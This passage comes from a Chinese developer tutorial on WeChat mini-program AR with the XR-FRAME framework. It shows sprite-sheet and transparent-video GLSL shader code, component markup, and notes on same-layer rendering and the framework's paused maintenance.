    <span class="hljs-attr">"kivicube-scene"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"plugin://kivicube/kivicube-scene"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"disableScroll"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"navigationStyle"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"custom"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">kivicube-scene</span>
  <span class="hljs-attr">wx:if</span>=<span class="hljs-string">"{{showAR}}"</span>
  <span class="hljs-attr">class</span>=<span class="hljs-string">"kivicube"</span>
  <span class="hljs-attr">scene-id</span>=<span class="hljs-string">"{{sceneId}}"</span>
  <span class="hljs-attr">bind:ready</span>=<span class="hljs-string">"ready"</span>
  <span class="hljs-attr">bind:error</span>=<span class="hljs-string">"error"</span>
  <span class="hljs-attr">bind:downloadAssetStart</span>=<span class="hljs-string">"downloadStart"</span>
  <span class="hljs-attr">bind:downloadAssetProgress</span>=<span class="hljs-string">"downloadProgress"</span>
  <span class="hljs-attr">bind:downloadAssetEnd</span>=<span class="hljs-string">"downloadEnd"</span>
  <span class="hljs-attr">bind:loadSceneStart</span>=<span class="hljs-string">"loadStart"</span>
  <span class="hljs-attr">bind:loadSceneEnd</span>=<span class="hljs-string">"loadEnd"</span>
  <span class="hljs-attr">bind:sceneStart</span>=<span class="hljs-string">"sceneStart"</span>
  <span class="hljs-attr">bind:openUrl</span>=<span class="hljs-string">"openUrl"</span>
  <span class="hljs-attr">bind:photo</span>=<span class="hljs-string">"photo"</span>
/&gt;</span>
</code></pre>
<p>使用同样的方法，我们可以得到小程序插件逆向的源码</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f32f55857a3e4b058ed27f251122cea0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765628355&amp;x-signature=xox6gRsfxdzBMLATpDz5HZ%2FL9bA%3D" alt="screenshot-20251201-201949.png" loading="lazy"/></p>
<p>通过源码分析可得知，<strong>Kivicube</strong> 使用的是底层<code>VisionKit</code> + 自研的<code>Threejs</code>封装</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d67414edcba94618bf25dc48ae75919e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765628355&amp;x-signature=P566Fm6l3zWu2RQF276ovXunp%2FM%3D" alt="screenshot-20251201-202405.png" loading="lazy"/></p>
<h2 data-id="heading-3">着色器</h2>
<blockquote>
<p>Shader，中文称为“着色器”，是一种在图形处理单元（GPU）上运行的计算机程序，用于定义和控制图形渲染过程中的各种视觉效果</p>
</blockquote>
<blockquote>
<p>使用 GLSL 的着色器（shader），GLSL 是一门特殊的有着类似于 C 语言的语法，在图形管道 (graphic pipeline) 中直接可执行的 OpenGL 着色语言。</p>
</blockquote>
<p>更多详情见MDN上的解释:<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FGames%2FTechniques%2F3D_on_the_web%2FGLSL_Shaders" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Games/Techniques/3D_on_the_web/GLSL_Shaders" ref="nofollow noopener noreferrer">GLSL Shaders</a></p>
<p>XR-FRME 提供了自定义效果的能力: <a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.weixin.qq.com%2Fminiprogram%2Fdev%2Fcomponent%2Fxr-frame%2Frender%2Feffect.html%23%25E5%25AE%259A%25E5%2588%25B6%25E4%25B8%2580%25E4%25B8%25AA%25E6%2595%2588%25E6%259E%259C" target="_blank" title="https://developers.weixin.qq.com/miniprogram/dev/component/xr-frame/render/effect.html#%E5%AE%9A%E5%88%B6%E4%B8%80%E4%B8%AA%E6%95%88%E6%9E%9C" ref="nofollow noopener noreferrer">定制一个效果</a></p>
<h3 data-id="heading-4">序列帧 SHADER</h3>
<p>XR-FRAME 官方的<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdtysky%2Fxr-frame-demo%2Ftree%2Fmaster%2Fminiprogram%2Fcomponents%2Ftemplate%2Fxr-template-frameEffect" target="_blank" title="https://github.com/dtysky/xr-frame-demo/tree/master/miniprogram/components/template/xr-template-frameEffect" ref="nofollow noopener noreferrer">《序列帧动画（雪碧图、GIF）》</a>示例，实现了一个简单的可配置的序列帧效果</p>
<p>而原神小程序AR的源码中，正是使用了这个序列帧效果实现了伪Live2d</p>
<p>首先我们需要将序列帧动画合成到一张<strong>M行*N列</strong>大小的<code>PNG</code>图片上(<strong>注意：微信小程序最大能渲染8000x8000左右分辨率的序列帧图片</strong>)</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc6888ab87b541f188753ffc2bdef98e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765628355&amp;x-signature=Yh%2Fd3NBuh3BlANeiMRNtfXWVkC4%3D" alt="1png" loading="lazy"/></p>
<p>如上图所示，我们这次的图片是<strong>8行x4列</strong>，共32张序列帧图片合成而来</p>
<p>源码示例: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdeepred5%2Fxr-frame-tutorial%2Ftree%2Fmain%2Fcomponents%2Fdemo6%2Findex.wxml" target="_blank" title="https://github.com/deepred5/xr-frame-tutorial/tree/main/components/demo6/index.wxml" ref="nofollow noopener noreferrer">序列帧 SHADER</a></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">xr-scene</span> <span class="hljs-attr">bind:ready</span>=<span class="hljs-string">"handleReady"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-assets</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xr-assets</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-node</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xr-node</span> <span class="hljs-attr">node-id</span>=<span class="hljs-string">"center"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xr-mesh</span> <span class="hljs-attr">visible</span>=<span class="hljs-string">"{{meshesVisible}}"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"animation-mesh"</span> <span class="hljs-attr">node-id</span>=<span class="hljs-string">"animation-mesh"</span> <span class="hljs-attr">position</span>=<span class="hljs-string">"0 0 0"</span> <span class="hljs-attr">scale</span>=<span class="hljs-string">"1 1 1.3"</span> <span class="hljs-attr">rotation</span>=<span class="hljs-string">"90 0 0"</span> <span class="hljs-attr">geometry</span>=<span class="hljs-string">"plane"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">xr-node</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-camera</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"center"</span> <span class="hljs-attr">clear-color</span>=<span class="hljs-string">"0.4 0.8 0.6 1"</span> <span class="hljs-attr">position</span>=<span class="hljs-string">"0 0 2.5"</span> <span class="hljs-attr">camera-orbit-control</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">xr-scene</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Component</span>({
  <span class="hljs-comment">/**
   * 组件的初始数据
   */</span>
  <span class="hljs-attr">data</span>: {
    <span class="hljs-attr">meshesVisible</span>: <span class="hljs-literal">false</span>
  },

  <span class="hljs-comment">/**
   * 组件的方法列表
   */</span>
  <span class="hljs-attr">methods</span>: {
    <span class="hljs-attr">handleReady</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">{ detail }</span>) {
      <span class="hljs-keyword">const</span> xrFrameSystem = wx.<span class="hljs-title function_">getXrFrameSystem</span>()
      <span class="hljs-keyword">const</span> <span class="hljs-title function_">createFrameEffect</span> = (<span class="hljs-params">scene</span>) =&gt; {
        <span class="hljs-keyword">return</span> scene.<span class="hljs-title function_">createEffect</span>({
          <span class="hljs-attr">name</span>: <span class="hljs-string">'frame-effect'</span>,
          <span class="hljs-attr">properties</span>: [
            {
              <span class="hljs-attr">key</span>: <span class="hljs-string">'columCount'</span>, <span class="hljs-comment">// 列数</span>
              <span class="hljs-attr">type</span>: xrFrameSystem.<span class="hljs-property">EUniformType</span>.<span class="hljs-property">FLOAT</span>,
              <span class="hljs-attr">default</span>: <span class="hljs-number">1</span>
            },
            {
              <span class="hljs-attr">key</span>: <span class="hljs-string">'rowCount'</span>, <span class="hljs-comment">// 行数</span>
              <span class="hljs-attr">type</span>: xrFrameSystem.<span class="hljs-property">EUniformType</span>.<span class="hljs-property">FLOAT</span>,
              <span class="hljs-attr">default</span>: <span class="hljs-number">1</span>
            },
            {
              <span class="hljs-attr">key</span>: <span class="hljs-string">'during'</span>, <span class="hljs-comment">// 持续时间</span>
              <span class="hljs-attr">type</span>: xrFrameSystem.<span class="hljs-property">EUniformType</span>.<span class="hljs-property">FLOAT</span>,
              <span class="hljs-attr">default</span>: <span class="hljs-number">1</span>
            }
          ],
          <span class="hljs-attr">images</span>: [
            {
              <span class="hljs-attr">key</span>: <span class="hljs-string">'u_baseColorMap'</span>,
              <span class="hljs-attr">default</span>: <span class="hljs-string">'white'</span>,
              <span class="hljs-attr">macro</span>: <span class="hljs-string">'WX_USE_BASECOLORMAP'</span>
            }
          ],
          <span class="hljs-comment">// 透明物体需要大于`2500`！</span>
          <span class="hljs-attr">defaultRenderQueue</span>: <span class="hljs-number">2501</span>,
          <span class="hljs-attr">passes</span>: [
            {
              <span class="hljs-attr">renderStates</span>: {
                <span class="hljs-attr">blendOn</span>: <span class="hljs-literal">false</span>,
                <span class="hljs-attr">depthWrite</span>: <span class="hljs-literal">true</span>,
                <span class="hljs-attr">cullOn</span>: <span class="hljs-literal">false</span>,
                <span class="hljs-comment">// 基础库 v3.0.1 开始 默认的 plane 切为适配 cw 的顶点绕序</span>
              },
              <span class="hljs-attr">lightMode</span>: <span class="hljs-string">'ForwardBase'</span>,
              <span class="hljs-attr">useMaterialRenderStates</span>: <span class="hljs-literal">true</span>,
              <span class="hljs-attr">shaders</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>]
            }
          ],
          <span class="hljs-attr">shaders</span>: [
            <span class="hljs-comment">// 顶点着色器 Vertex shaders</span>
            <span class="hljs-string">`#version 100

          precision highp float;
          precision highp int;
    
          attribute vec3 a_position;
          attribute highp vec2 a_texCoord;
      
          uniform mat4 u_view;
          uniform mat4 u_projection;
          uniform mat4 u_world;
          varying highp vec2 v_uv;
          void main()
          {
            v_uv = a_texCoord;
            gl_Position = u_projection * u_view * u_world * vec4(a_position, 1.0);
          }`</span>,
            <span class="hljs-comment">// 片段着色器 Fragment shaders</span>
            <span class="hljs-string">`#version 100
            precision highp float;
            precision highp int;

            uniform sampler2D u_baseColorMap;
            uniform highp float u_gameTime;
            uniform highp float rowCount;
            uniform highp float columCount;
            uniform highp float during;
            varying highp vec2 v_uv;
            void main()
            {
              float loopTime = mod(u_gameTime, during);

              float tickPerFrame = during / (columCount * rowCount);
              
              float columTick = mod(floor(loopTime / tickPerFrame), columCount);
              float rowTick = floor(loopTime / tickPerFrame / columCount);

              vec2 texCoord = vec2(v_uv.x / columCount + (1.0 / columCount) * columTick , v_uv.y / rowCount + (1.0 / rowCount) * rowTick);
              vec4 color = texture2D(u_baseColorMap, texCoord);
              gl_FragColor = color;
            }`</span>
          ],
        });
      }
      xrFrameSystem.<span class="hljs-title function_">registerEffect</span>(<span class="hljs-string">'frame-effect'</span>, createFrameEffect)
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">scene</span> = detail.<span class="hljs-property">value</span>

      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">loadAsset</span>()
    },

    <span class="hljs-keyword">async</span> <span class="hljs-title function_">loadAsset</span>(<span class="hljs-params"/>) {
      <span class="hljs-keyword">const</span> xrFrameSystem = wx.<span class="hljs-title function_">getXrFrameSystem</span>();
      <span class="hljs-keyword">const</span> xrScene = <span class="hljs-variable language_">this</span>.<span class="hljs-property">scene</span>;

      <span class="hljs-keyword">await</span> xrScene.<span class="hljs-property">assets</span>.<span class="hljs-title function_">loadAsset</span>({
        <span class="hljs-attr">type</span>: <span class="hljs-string">'texture'</span>,
        <span class="hljs-attr">assetId</span>: <span class="hljs-string">'lzy'</span>,
        <span class="hljs-attr">src</span>: <span class="hljs-string">'https://assets.xxxx.com/resources/cdn/20251022/0ac5e7c80c0fc262.png'</span>,
      })

      <span class="hljs-comment">// 第一个参数是效果实例的引用，第二个参数是默认`uniforms`</span>
      <span class="hljs-keyword">const</span> frameMaterial = xrScene.<span class="hljs-title function_">createMaterial</span>(
        <span class="hljs-comment">// 使用定制的效果</span>
        xrScene.<span class="hljs-property">assets</span>.<span class="hljs-title function_">getAsset</span>(<span class="hljs-string">'effect'</span>, <span class="hljs-string">'frame-effect'</span>),
        { <span class="hljs-attr">u_baseColorMap</span>: xrScene.<span class="hljs-property">assets</span>.<span class="hljs-title function_">getAsset</span>(<span class="hljs-string">'texture'</span>, <span class="hljs-string">'lzy'</span>) }
      )

      <span class="hljs-comment">// 可以将其添加到资源系统中备用</span>
      xrScene.<span class="hljs-property">assets</span>.<span class="hljs-title function_">addAsset</span>(<span class="hljs-string">'material'</span>, <span class="hljs-string">'frame-effect'</span>, frameMaterial)

      <span class="hljs-keyword">const</span> meshElement = xrScene.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'animation-mesh'</span>).<span class="hljs-title function_">getComponent</span>(xrFrameSystem.<span class="hljs-property">Mesh</span>)
      frameMaterial.<span class="hljs-title function_">setFloat</span>(<span class="hljs-string">'columCount'</span>, <span class="hljs-number">4</span>)
      frameMaterial.<span class="hljs-title function_">setFloat</span>(<span class="hljs-string">'rowCount'</span>, <span class="hljs-number">8</span>)
      frameMaterial.<span class="hljs-title function_">setFloat</span>(<span class="hljs-string">'during'</span>, <span class="hljs-number">1</span>)
      frameMaterial.<span class="hljs-property">alphaMode</span> = <span class="hljs-string">"BLEND"</span>
      meshElement.<span class="hljs-property">material</span> = frameMaterial

      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setData</span>({
        <span class="hljs-attr">meshesVisible</span>: <span class="hljs-literal">true</span>
      })
    },
  }
})
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e05c150492e74fdd888cd2b458c32476~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765628355&amp;x-signature=clZKsFD45jDZoAuPz280GnQmTEs%3D" alt="frame.gif" loading="lazy"/></p>
<h3 data-id="heading-5">透明视频 SHADER</h3>
<p>一般的透明视频：</p>
<ol>
<li>自带透明通道的视频格式: mov  (小程序默认不支持<code>mov</code>格式播放)</li>
<li>特殊处理后的左右分屏视频格式: mp4 （小程序默认支持<code>mp4</code>格式播放）</li>
</ol>
<ul>
<li>左边是视频的 RGB</li>
<li>右边是视频的 Alpha</li>
<li>左右叠加即可渲染透明视</li>
</ul>
<p>更多详情见前文<a href="https://juejin.cn/post/7238792624387506213#heading-2" target="_blank" title="https://juejin.cn/post/7238792624387506213#heading-2">《更高效的web动效解决方案 - 背景视频》</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31d189b638a64320b0e2c7298c0500f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765628355&amp;x-signature=HNkOSQJy5oedGCub%2BQkYaS6xXqQ%3D" alt="v.gif" loading="lazy"/></p>
<p>XR-FRAME 官方的<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdtysky%2Fxr-frame-demo%2Ftree%2Fmaster%2Fminiprogram%2Fcomponents%2Ftemplate%2Fxr-template-removeBlack" target="_blank" title="https://github.com/dtysky/xr-frame-demo/tree/master/miniprogram/components/template/xr-template-removeBlack" ref="nofollow noopener noreferrer">《过滤黑色背景视频》</a>示例，正好演示了<code>左右分屏</code>视频的过滤黑色背景能力</p>
<p>源码示例: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdeepred5%2Fxr-frame-tutorial%2Ftree%2Fmain%2Fcomponents%2Fdemo7%2Findex.wxml" target="_blank" title="https://github.com/deepred5/xr-frame-tutorial/tree/main/components/demo7/index.wxml" ref="nofollow noopener noreferrer">透明视频 SHADER</a></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">xr-scene</span> <span class="hljs-attr">bind:ready</span>=<span class="hljs-string">"handleReady"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-assets</span> <span class="hljs-attr">bind:progress</span>=<span class="hljs-string">"handleAssetsProgress"</span> <span class="hljs-attr">bind:loaded</span>=<span class="hljs-string">"handleAssetsLoaded"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xr-asset-load</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"video-texture"</span> <span class="hljs-attr">asset-id</span>=<span class="hljs-string">"lzy"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://assets.xxxx.com/resources/cdn/20251022/bd7cb6ba6546d697.mp4"</span> <span class="hljs-attr">options</span>=<span class="hljs-string">"autoPlay:true,loop:true"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xr-asset-material</span> <span class="hljs-attr">asset-id</span>=<span class="hljs-string">"removeBlack-mat"</span> <span class="hljs-attr">effect</span>=<span class="hljs-string">"removeBlack"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">xr-assets</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-node</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xr-node</span> <span class="hljs-attr">node-id</span>=<span class="hljs-string">"center"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xr-node</span> <span class="hljs-attr">wx:if</span>=<span class="hljs-string">"{{loaded}}"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">xr-mesh</span> <span class="hljs-attr">node-id</span>=<span class="hljs-string">"video-item"</span> <span class="hljs-attr">position</span>=<span class="hljs-string">"0 0 0"</span> <span class="hljs-attr">rotation</span>=<span class="hljs-string">"90 0 0"</span> <span class="hljs-attr">scale</span>=<span class="hljs-string">"1 1 1.3"</span> <span class="hljs-attr">geometry</span>=<span class="hljs-string">"plane"</span> <span class="hljs-attr">material</span>=<span class="hljs-string">"removeBlack-mat"</span> <span class="hljs-attr">uniforms</span>=<span class="hljs-string">"u_videoMap: video-lzy"</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">xr-node</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">xr-node</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-camera</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"center"</span> <span class="hljs-attr">clear-color</span>=<span class="hljs-string">"0.4 0.8 0.6 1"</span> <span class="hljs-attr">position</span>=<span class="hljs-string">"0 0 3"</span> <span class="hljs-attr">camera-orbit-control</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">xr-scene</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> xrFrameSystem = wx.<span class="hljs-title function_">getXrFrameSystem</span>();

xrFrameSystem.<span class="hljs-title function_">registerEffect</span>(<span class="hljs-string">'removeBlack'</span>, <span class="hljs-function"><span class="hljs-params">scene</span> =&gt;</span> scene.<span class="hljs-title function_">createEffect</span>({
  <span class="hljs-attr">name</span>: <span class="hljs-string">"removeBlack"</span>,
  <span class="hljs-attr">images</span>: [{
    <span class="hljs-attr">key</span>: <span class="hljs-string">'u_videoMap'</span>,
    <span class="hljs-attr">default</span>: <span class="hljs-string">'white'</span>,
    <span class="hljs-attr">macro</span>: <span class="hljs-string">'WX_USE_VIDEOMAP'</span>
  }],
  <span class="hljs-attr">defaultRenderQueue</span>: <span class="hljs-number">2000</span>,
  <span class="hljs-attr">passes</span>: [{
    <span class="hljs-string">"renderStates"</span>: {
      <span class="hljs-attr">cullOn</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">blendOn</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">blendSrc</span>: xrFrameSystem.<span class="hljs-property">EBlendFactor</span>.<span class="hljs-property">SRC_ALPHA</span>,
      <span class="hljs-attr">blendDst</span>: xrFrameSystem.<span class="hljs-property">EBlendFactor</span>.<span class="hljs-property">ONE_MINUS_SRC_ALPHA</span>,
      <span class="hljs-attr">cullFace</span>: xrFrameSystem.<span class="hljs-property">ECullMode</span>.<span class="hljs-property">BACK</span>,
    },
    <span class="hljs-attr">lightMode</span>: <span class="hljs-string">"ForwardBase"</span>,
    <span class="hljs-attr">useMaterialRenderStates</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">shaders</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>]
  }],
  <span class="hljs-attr">shaders</span>: [
    <span class="hljs-comment">// 顶点着色器 Vertex shaders</span>
    <span class="hljs-string">`#version 100

uniform highp mat4 u_view;
uniform highp mat4 u_viewInverse;
uniform highp mat4 u_vp;
uniform highp mat4 u_projection;
uniform highp mat4 u_world;

attribute vec3 a_position;
attribute highp vec2 a_texCoord;

varying highp vec2 v_UV;

void main()
{
  v_UV = a_texCoord;
  vec4 worldPosition = u_world * vec4(a_position, 1.0);
  gl_Position = u_projection * u_view * worldPosition;
  }`</span>,
    <span class="hljs-comment">// 片段着色器 Fragment shaders</span>
    <span class="hljs-string">`#version 100

precision mediump float;
precision highp int;
varying highp vec2 v_UV;

#ifdef WX_USE_VIDEOMAP
  uniform sampler2D u_videoMap;
#endif

void main()
{
#ifdef WX_USE_VIDEOMAP
  // 左右分屏透明视频处理：
  // 左半边 (0-0.5) 为彩色内容，右半边 (0.5-1.0) 为透明度遮罩
  
  // 1. 采样左半边获取 RGB 颜色
  vec2 colorUV = vec2(v_UV.x * 0.5, v_UV.y);
  vec4 color = texture2D(u_videoMap, colorUV);
  
  // 2. 采样右半边获取 Alpha 遮罩
  vec2 alphaUV = vec2(v_UV.x * 0.5 + 0.5, v_UV.y);
  vec4 alphaSample = texture2D(u_videoMap, alphaUV);
  float alpha = alphaSample.r; // 使用红色通道作为透明度（灰度值）
  
  // 3. 输出颜色 + 遮罩透明度（不做伽马校正，避免变暗）
  gl_FragData[0] = vec4(color.rgb, alpha);
#else
  gl_FragData[0] = vec4(1.0, 1.0, 1.0, 1.0);
#endif
}
`</span>],
}));

<span class="hljs-title class_">Component</span>({
  <span class="hljs-comment">/**
   * 组件的初始数据
   */</span>
  <span class="hljs-attr">data</span>: {

  },

  <span class="hljs-comment">/**
   * 组件的方法列表
   */</span>
  <span class="hljs-attr">methods</span>: {
    <span class="hljs-title function_">handleReady</span>(<span class="hljs-params">{
      detail
    }</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'handleReady'</span>, detail.<span class="hljs-property">value</span>)
    },
    <span class="hljs-title function_">handleAssetsProgress</span>(<span class="hljs-params">{ detail }</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'assets progress'</span>, detail.<span class="hljs-property">value</span>)
    },
    <span class="hljs-title function_">handleAssetsLoaded</span>(<span class="hljs-params">{ detail }</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'assets loaded'</span>, detail.<span class="hljs-property">value</span>)
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setData</span>({ <span class="hljs-attr">loaded</span>: <span class="hljs-literal">true</span> })
    },
  }
})
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/934ab4b7b4594367a9c52d83af8ae544~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765628355&amp;x-signature=qMU97h6yVGDHXpE08bsMDCmF2wM%3D" alt="v2.gif" loading="lazy"/></p>
<h2 data-id="heading-6">实战案例</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5f6ce2aa5995428e803a9d1725edb430~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765628355&amp;x-signature=iYQP3EXFGEOPjnz2f4n0HfIJoFk%3D" alt="work.gif" loading="lazy"/></p>
<p>源码示例: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdeepred5%2Fxr-frame-tutorial%2Ftree%2Fmain%2Fpages%2Fdemo8" target="_blank" title="https://github.com/deepred5/xr-frame-tutorial/tree/main/pages/demo8" ref="nofollow noopener noreferrer">序列帧 SHADER</a></p>
<h3 data-id="heading-7">同层渲染</h3>
<p>目前XR-FRAME尚未支持和小程序的UI元素混写，但我们可以使用同层方案</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">view</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">demo8</span>
    <span class="hljs-attr">disable-scroll</span>
    <span class="hljs-attr">id</span>=<span class="hljs-string">"main-frame"</span>
    <span class="hljs-attr">width</span>=<span class="hljs-string">"{{renderWidth}}"</span>
    <span class="hljs-attr">height</span>=<span class="hljs-string">"{{renderHeight}}"</span>
    <span class="hljs-attr">style</span>=<span class="hljs-string">"width:{{width}}px;height:{{height}}px;top:{{top}}px;left:{{left}}px;"</span>
    <span class="hljs-attr">bind:arTrackerSwitch</span>=<span class="hljs-string">"handleTrackerSwitch"</span>
    <span class="hljs-attr">markerImg</span>=<span class="hljs-string">"{{markerImg}}"</span>
  /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"marker-tip-container"</span> <span class="hljs-attr">hidden</span>=<span class="hljs-string">"{{hiddenTip}}"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"marker-img-container"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">mode</span>=<span class="hljs-string">"aspectFit"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"marker-img"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"{{markerImg}}"</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"marker-text-container"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"marker-text"</span>&gt;</span>请对准识别图<span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
</code></pre>
<p><code>demo8</code>是XR-FRAME组件，它和<code>view</code>UI组件处在同一层，这既是所谓的同层渲染方案。而同层方案，就必然涉及到组件通信</p>
<p>XR-FRAME组件需要将AR的识别状态同步给父级，父级根据不同的AR状态，展示不同的UI界面。而这些通信方式，和传统的组件通信方式基本一致：父级传递函数和属性到子级，子级通过执行回调函数传递数据</p>
<h2 data-id="heading-8">框架维护</h2>
<p>比较尴尬的是，<a href="https://link.juejin.cn?target=https%3A%2F%2Fdtysky.moe%2Farticle%2FArt-%25E5%258E%258C%25E5%2580%25A62024" target="_blank" title="https://dtysky.moe/article/Art-%E5%8E%8C%E5%80%A62024" ref="nofollow noopener noreferrer">核心技术负责人</a>已离开团队，XR-FRAME框架处于<strong>暂停维护</strong>状态</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2e02a56599974e21922b20c18634537f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765628355&amp;x-signature=jYuC%2FBrucGs9Qu3%2Fua%2FbZMWrIr4%3D" alt="screenshot-20251201-214919.png" loading="lazy"/></p>
<h2 data-id="heading-9">资料</h2>
<ul>
<li>演示源码：<a href="https://link.juejin.cn?target=http%3A%2F%2Fgithub.com%2Fdeepred5%2Fxr-frame-tutorial%2F" target="_blank" title="http://github.com/deepred5/xr-frame-tutorial/" ref="nofollow noopener noreferrer">github.com/deepred5/xr…</a></li>
